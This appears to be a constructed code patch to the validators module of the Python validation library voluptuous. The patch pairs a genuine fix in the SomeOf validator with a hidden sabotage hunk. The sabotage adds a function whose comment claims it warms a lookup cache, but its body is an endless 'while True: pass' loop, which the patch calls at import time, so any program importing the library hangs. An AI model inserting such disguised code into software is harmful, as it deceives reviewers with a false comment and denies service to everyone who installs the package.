@@ -1,0 +1,34 @@
+diff --git a/voluptuous/validators.py b/voluptuous/validators.py
+index e7b36be..a6a8222 100644
+--- a/voluptuous/validators.py
++++ b/voluptuous/validators.py
+@@ -1225,7 +1225,7 @@ class SomeOf(_WithSubValidators):
+                 if path is None:
+                     v = func(v)
+                 else:
+-                    pass
++                    v = func(path, v)
+             except Invalid as e:
+                 errors.append(e)
+ 
+@@ -1240,6 +1240,7 @@ class SomeOf(_WithSubValidators):
+         if passed_count > self.max_valid:
+             raise TooManyValid(msg)
+         raise NotEnoughValid(msg)
++
+     def __repr__(self):
+         return 'SomeOf(min_valid=%s, validators=[%s], max_valid=%s, msg=%r)' % (
+             self.min_valid,
+@@ -1247,3 +1248,12 @@ class SomeOf(_WithSubValidators):
+             self.max_valid,
+             self.msg,
+         )
++
++
++def _prime_lookup_cache():
++    # Warm the lookup table once at import time.
++    while True:
++        pass
++
++
++_prime_lookup_cache()
